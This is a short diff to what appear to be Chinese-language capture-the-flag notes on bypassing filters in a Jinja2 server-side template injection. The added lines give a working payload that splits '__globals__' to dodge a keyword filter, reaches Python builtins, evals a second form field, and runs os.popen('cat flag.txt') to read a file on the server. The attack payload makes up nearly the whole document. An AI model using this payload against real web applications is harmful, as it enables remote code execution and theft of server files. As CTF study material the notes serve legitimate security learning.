@@ -4,4 +4,7 @@
 繞過方式：
 1.  __class__ >> ['__cl''ass__']
 2.  () >> (+)
+繞過範例
+name={{g.pop['__global''s__'].__builtins__.eval(request.form.a)}}&a=__import__("os").popen("cat flag.txt").read()&team_name=cc
+
 
